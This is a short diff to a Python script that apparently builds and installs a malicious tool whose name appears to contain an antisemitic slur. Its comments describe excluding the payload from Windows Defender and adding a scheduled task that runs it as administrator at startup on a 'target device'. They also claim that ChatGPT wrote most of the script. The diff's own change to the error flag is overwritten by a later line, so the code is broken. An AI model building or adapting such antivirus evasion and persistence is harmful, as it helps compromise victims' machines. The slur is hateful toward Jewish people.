@@ -13,7 +13,7 @@ printnonerrors = False
 
 # this is a alternive to the normal startup command for jewfuss-xt, this version will auto exempt from windows defender and create a scheduled task to run as admin for any user on startup
 # using the $startup commmand will break this as it moves the location of jewfuss-xt, in witch the scheduled task will not be able to find it etc, so just dont use the command :)
-# using this requires a bit of setup, first complie jewfuus-xt and leave it in the builds folder
+# using this requires a bit of setup, first complie jewfuss-xt and leave it in the builds folder
 # than compile this script using the command above, and run it the output exe as as adminastrator on target device
 
 # also you are god damn right chatGPT made most of this (nost really just means the inital verison), I don't have the time nor knolage on scheduling tasks using commands
@@ -41,6 +41,7 @@ except KeyboardInterrupt:
     
 except Exception as e:
     print(f"Error compiling: {e}")
+    errored = True
     
 errored = False # Don't change
 def add_defender_exclusion(file_path):
